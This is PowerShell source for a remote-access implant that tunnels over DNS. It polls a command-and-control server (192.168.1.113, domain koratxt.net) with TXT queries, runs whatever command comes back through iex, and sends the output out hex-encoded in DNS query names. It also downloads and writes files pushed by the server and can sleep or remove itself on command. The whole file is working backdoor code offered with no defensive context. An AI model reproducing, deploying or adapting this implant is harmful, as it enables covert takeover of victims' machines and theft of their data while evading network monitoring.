
$server = '192.168.1.113'
$name = 'koratxt.net'
$hostname = Get-Content env:computername
if ($hostname.Length -gt 23) {
    $hostname = $hostname.Substring(0,23)
}

function serverGet($query){
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($(Resolve-DnsName -Server $server -Name "$query.$name" -Type TXT).Strings))
}

function StringToHex($i) {
    $r = ""
    $i.ToCharArray() | ForEach-Object -Process {
        $r += '{0:X2}' -f [int][char]$_
    }
    return $r
}

function HexToString($i) {
    $r = ""
    for ($n = 0; $n -lt $i.length; $n += 2) {
        $r += [char][int]("0x" + $i.Substring($n,2))
    }
    return $r
}

Function Get-StringHash 
{ 
    param
    (
        [String] $String,
        $HashName = "MD5"
    )
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($String)
    $algorithm = [System.Security.Cryptography.HashAlgorithm]::Create('MD5')
    $StringBuilder = New-Object System.Text.StringBuilder 
  
    $algorithm.ComputeHash($bytes) | 
    ForEach-Object { 
        $null = $StringBuilder.Append($_.ToString("x2")) 
    } 
  
    return $StringBuilder.ToString() 
}

function split_to_chunks($astring, $size=38) {     # currently, if the chunk is the exact size of the block, an extra dns request is sent. need to use a do...while loop instead
    $new_arr = @()
    $chunk_index=0
    for ($i=0; $i -lt [math]::floor($astring.length / $size); $i++) {
        $new_arr += @($astring.substring($chunk_index,$size))
        $chunk_index += $size
    }
    $new_arr += @($astring.substring($chunk_index,$astring.length - $chunk_index))
    return $new_arr
}

function send_response($response) {
    $chunks = (split_to_chunks (StringToHex ($response)))
    foreach ($j in $chunks) {
        serverget("$j.$id.$(StringToHex('cnk'))")
    }
    serverget("$id.$(StringToHex('end'))")
}

function dissolve(){
    serverget("$id.$(StringToHex('dis'))")
    Exit
}

function hibernate(){
    $encCmd = StringToHex('hib')
    $hibernateLength = [int]$(serverget("$(StringToHex('time')).$id.$encCmd"))
    serverget("$(StringToHex('set')).$id.$encCmd")
    try{
        sleep -Seconds "$hibernateLength"
        serverget("$(StringToHex('done')).$id.$encCmd")
    } 
    catch {
        $lasterror = $Error[0].Exception.Message
        send_response("$lasterror")
    }
}

function savefile(){
    $file = @()
    $index = 0
    $encCmd = StringToHex('fil')

    $filename = serverget("$(StringToHex('name')).$id.$encCmd")
    $filesize = serverget("$(StringToHex('size')).$id.$encCmd")
    while ($index -lt $filesize){
        $b64 = $(Resolve-DnsName -Server $server -Name "$(StringToHex($index.ToString())).$id.$encCmd.$name" -Type TXT).Strings[0]
        $index += $b64.Length
        $file += [Convert]::FromBase64String($b64)
    }
    try{
        [Environment]::CurrentDirectory = $PWD
        iex '[io.file]::WriteAllBytes($filename, $file)'
        serverget("$(StringToHex('done')).$id.$encCmd")
    }
    catch {
        $lasterror = $Error[0].Exception.Message
        send_response("$lasterror")
    }
    
}

#initialize
$id = serverget("$(StringtoHex($hostname)).0.$(StringToHex('int'))")
while (!$id){
    sleep -Seconds 60
    $id = serverget("$(StringtoHex($hostname)).0.$(StringToHex('int'))")
}

while ($true) {
    $cmd = serverget("$id.$(StringToHex('cmd'))")

    if ($cmd.length -ne 0) {
        if ($cmd -eq "dissolve"){                       # server wants the client to dissolve
            dissolve
        }
        if ($cmd -eq "hibernate"){                      # server wants the client to sleep
            hibernate
            continue
        }
        if ($cmd -eq "file"){                           # server wants to send a file
            savefile
            continue
        }
        if ($cmd -ne "wait"){                           # server has a command to run
            try{
                $response = (iex "$cmd") | Out-String
                if ($response.Length -gt 0) {
                    send_response $response
                }
            } 
            catch {
                $lasterror = $Error[0].Exception.Message
                send_response("$lasterror")
            }
        }
    }

    sleep -Seconds 5
}